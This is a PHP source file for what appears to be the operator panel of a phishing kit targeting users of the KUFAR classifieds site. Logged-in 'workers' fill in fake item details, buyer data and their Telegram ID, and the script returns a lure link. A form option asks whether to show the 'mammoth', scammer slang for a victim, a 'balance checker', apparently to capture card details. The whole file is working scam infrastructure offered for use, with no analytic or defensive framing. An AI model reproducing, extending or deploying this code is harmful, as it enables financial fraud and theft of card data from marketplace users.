<?php

include "config.php";
$cmd = $_POST['cmd'];
switch ($cmd){
    case 'login':
        $link = Users::find(['login'=>$_POST['login']]);
        if($link->pass === $_POST['pass']){
            $_SESSION['auth'] = 1;
        }

        break;
    case 'destroy':
        session_destroy();
        header("Location:/generator.php");
        break;

}
$text = "";
if(isset($_POST['name']) && isset($_POST['price']) && isset($_POST['image'])  && isset($_POST['worker'])){
    if($_POST['name'] != "" && $_POST['price'] != "" && $_POST['image'] != "" && $_POST['worker'] !="") {
        $link = new Links();
        $link->name = $_POST['name'];
        $link->order_id = substr(md5(rand(0, 9999999999999)), 0, 12);
        $link->price = $_POST['price'];
        $link->oldprice = '';
        $link->image = $_POST['image'];
        $link->worker = $_POST['worker'];
        $link->worker_id = $_POST['worker_id'];
        $link->fio = $_POST['fio'];
        $link->name20 = '';
        $link->adress = $_POST['adress'];
        $link->type = $_POST['type'];
        $link->balance = $_POST['balance'];
        $link->plochad = '';
        $link->jilplochad = '';
        $link->kuhna = '';
        $link->etaj = '';
        $link->postroen = '';
        $link->opisanie = '';
        $link->jk = '';
        $link->platform = 'KUFAR';
        $link->status = 0;
        $link->date = '';
        if ($link->save()) {
            $text = "Ваша ссылка : https://" . $_SERVER['HTTP_HOST'] . "/index.php?id=" . $link->order_id;
        } else {
            $text = "Не удалось сохранить ссылку";
        }
    }else {
        $text = "Не удалось сохранить ссылку";
    }
}



?>
<!DOCTYPE html>
<html lang="ru"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>Генератор</title>
    <link rel="stylesheet" type="text/css" href="/css/bootstrap.css">
    <link rel="stylesheet" type="text/css" href="/css/common.css">
    <meta name="viewport" content="width=device-width; initial-scale=1">
</head>

<body style="padding-top: 10px;">
<div class="block-info">

    <?php

    if(isset($_SESSION['auth'])):
        ?>
        <h3 class="heading-info">
            Генератор ссылок
        </h3>
        <p class="description-info"> С помощью этой формы вы можете создать ссылку KUFAR 1.0/2.0</p>
    <?php
    else:
        ?>
        <h3 class="heading-info">
            Авторизация
        </h3>
        <p class="description-info"> Авторизируйтесь прежде чем начать работу</p>
    <?php
    endif;
    ?>
</div>
<div class="divider" style="margin-bottom: 25px;"></div>
<div class="block-form">
    <?php

    if(isset($_SESSION['auth'])):
        ?>
        <form action="" method="POST">
            <input type="hidden" name="cmd" value="destroy">
            <button type="submit" class="btn bg-danger col-md-12">Выйти из генератора</button>
        </form>
        <form action="/generator.php" method="POST">
            <div class="row">
                <div class="col-xs-12 col-lg-12">
                    <div class="form-group">
                        <label for="input-month2">Выберите тип обьявления
                            <br> </label>
                        <select class="form-control" name="type" required>
                            <option value="1" selected>1.0</option>
                            <option value="2">2.0</option>
                        </select> </div>
                </div>

                <div class="col-xs-12 col-lg-12">
                    <div class="form-group">
                        <label for="input-month2">Показать мамонту чекер баланса?
                            <br> </label>
                        <select class="form-control" name="balance" required>
                            <option value="1" selected>Да</option>
                            <option value="0">Нет</option>
                        </select> </div>
                </div>
                <div class="col-xs-12 col-lg-12">
                    <div class="form-group">
                        <label for="input-month2">Введи название товара
                            <br> </label>
                        <input name="name" type="text" class="form-control" placeholder="Название товара" required> </div>
                </div>
                <div class="col-xs-12 col-lg-12">
                    <div class="form-group">
                        <label for="input-month">Введи цену товара</label>
                        <input name="price" placeholder="Цена" type="text" class="form-control" id="input-s" required> </div>
                </div>
                <div class="col-xs-12 col-lg-12">
                    <div class="form-group">
                        <label for="input-month">ссылка на картинку</label>
                        <input name="image" placeholder="" type="text" class="form-control" id="input-s" required> </div>
                </div>
                <div class="col-xs-12 col-lg-12">
                    <div class="form-group">
                        <label for="input-month">ФИО покупателя 2.0</label>
                        <input name="fio" placeholder="Петров Иван Иванович" type="text" class="form-control" id="input-s" required> </div>
                </div>

               <!-- <div class="col-xs-12 col-lg-12">
                    <div class="form-group">
                        <label for="input-month">Имя покупателя 2.0</label>
                        <input name="name20" placeholder="Иван" type="text" class="form-control" id="input-s" required> </div>
                </div>-->
                <div class="col-xs-12 col-lg-12">
                    <div class="form-group">
                        <label for="input-month">Адрес покупателя 2.0</label>
                        <input name="adress" placeholder="" type="text" class="form-control" id="input-s" required> </div>
                </div>

                <div class="col-xs-12 col-lg-12">
                    <div class="form-group">
                        <label for="input-month">Введи свой @USERNAME</label>
                        <input name="worker" placeholder="@freeman" type="text" class="form-control" id="input-s" required> </div>
                </div>
                <div class="col-xs-12 col-lg-12">
                    <div class="form-group">
                        <label for="input-month">Введи свой id в telegramm(Чтобы уведы приходили в лс)</label>
                        <input name="worker_id" placeholder="324234234234" type="text" class="form-control" id="input-s" required> </div>
                </div>
            </div>
            <div class="divider"></div>
            <div class="block-footer">
                <div class="row">
                    <div class="col-xs-12">
                        <input class="button-primary" type="submit" value="Сгенерировать">
                        <br> </div>
                    <div class="col-md-12">
                        <?=$text;?></div>
                </div>
            </div>
        </form>
    <?php
    else:

        ?>
        <div class="row">
            <div class="col-xs-12 col-lg-12">
                <div class="form-group">
                    <form action="" method="post">
                        <div class="form-group">
                            <input type="hidden" class="form-control" name="cmd" value="login">
                        </div>
                        <input type="text" placeholder="введите логин" class="form-control" name="login" value="">
                        <input type="password" placeholder="введите пароль" class="form-control" name="pass" value="">
                        <button class="btn bg-primary col-md-12" type="submit">отправить</button>
                    </form>
                </div></div>
        </div>

    <?php
    endif;

    ?>
</div>

</body></html>